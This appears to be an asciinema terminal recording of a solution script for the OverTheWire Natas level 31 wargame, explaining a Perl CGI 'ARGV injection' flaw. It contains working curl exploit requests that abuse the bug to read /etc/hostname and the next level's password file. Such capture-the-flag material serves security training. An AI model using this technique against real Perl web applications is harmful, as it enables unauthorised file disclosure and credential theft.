{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793521966,"idle_time_limit":2.0,"command":"bash /home/claude/solves/natas/L31.sh","title":"Natas L31 -> natas32: CGI param/ARGV injection - plain file=ARGV field makes open() read @ARGV from the query string","env":{"SHELL":"/bin/bash"}}
[0.002, "o", "$ curl -s -u natas31:<pw> http://natas31.natas.labs.overthewire.org/index-source.html\r\n$   source: if ($cgi->upload(\"file\")) { my $file = $cgi->param(\"file\");\r\n$           while (<$file>) { ... split /,/ ... } }\r\n"]
[0.862, "o", "if ($cgi->upload('file')) {\r\n    my $file = $cgi->param('file');\r\n    while (<$file>) {\r\n        my @elements=split /,/, $_;\r\n    Select file to upload:\r\n"]
[0.000, "o", "$ the filehandle is opened with Perl 2-arg open on the string param(\"file\").\r\n$ CGI lets a POST body contain a NON-FILE field with the same name \"file\":\r\n$   if it comes first, param(\"file\") returns that plain value (e.g. \"ARGV\").\r\n$ and CGI.pm also fills @ARGV from the query string for keyword-style requests,\r\n$   which is the classic \"ARGV injection\" bug (CVE-2014-1572-ish family).\r\n$ So: send file=ARGV as a plain field, then the real upload, and put the target\r\n$   path in the query string. open(\"ARGV\") reads @ARGV, i.e. the query words.\r\n$ 1. plain field file=ARGV + real upload, query = /etc/hostname (proof):\r\n$ curl -s -u natas31:<pw> -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas31.natas.labs.overthewire.org/index.pl?/etc/hostname'\r\n"]
[0.436, "o", "<table class=\"sortable table table-hover table-striped\"><tr><th>natas-0\r\n</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\r\n"]
[0.001, "o", "$ 2. the same with the next password file:\r\n$ curl -s -u natas31:<pw> -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32'\r\n"]
